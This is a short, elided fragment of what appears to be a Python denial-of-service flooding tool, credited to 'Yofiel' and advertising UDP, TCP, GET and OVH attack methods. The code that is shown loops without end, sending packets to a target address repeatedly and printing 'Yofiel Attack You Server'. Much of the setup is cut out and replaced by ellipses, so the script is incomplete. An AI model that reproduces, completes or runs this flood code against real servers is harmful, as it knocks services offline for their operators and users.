...
print("\033[95m>> CODED : Yofiel. ") 
print("\033[95m>>>> TOOLS PRIVATE YOFIEL")
print("\033[91m                                       METHOD: UDP-TCP-GET-OVH              ")
...
def run4():
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Yofiel Attack You Server")
		except:
			print("[!] ERROR SERVER TIME OUT")
